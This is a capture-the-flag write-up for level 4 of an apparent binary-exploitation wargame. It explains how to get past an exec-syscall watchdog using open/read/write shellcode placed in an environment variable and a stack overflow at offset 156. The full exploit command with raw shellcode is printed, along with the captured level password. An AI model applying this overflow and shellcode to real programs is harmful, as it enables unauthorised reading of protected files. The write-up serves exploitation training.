# Level 4

Here the program is using multiple process with the main process watching the child in which we will do our exploit to see if we are trying to use the exec syscall. So we have to cook a new shellcode that does not use the exec syscall. To do so we do an open, read, write on the .pass file which is faster but way bigger in characters.

Now that we have our shellcode, we have to place it somewhere and the only place where we have nearly unlimited room to place our gigabig shellcode is the env. So we will place our variable in the env and use env -i to make sure the env is empty and the addresses are always the same.

Now we get the EIP offset with the cyclic string as usual and find the offset is 156 and we just place our shellcode address into EIP and run it

```bash
level04@OverRide:~$ python -c 'print "\x90" * 156 + "\x73\xdf\xff\xff"' | env -i SHELLCODE=$(python -c 'print "\x31\xc0\x50\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x68\x90\x90\x90\x90\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x35\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc9\x31\xd2\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x89\xe1\xb2\x80\xb0\x03\xcd\x80\xb0\x04\xb3\x01\xcd\x80\x31\xc0\xb0\x06\xcd\x80"') ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```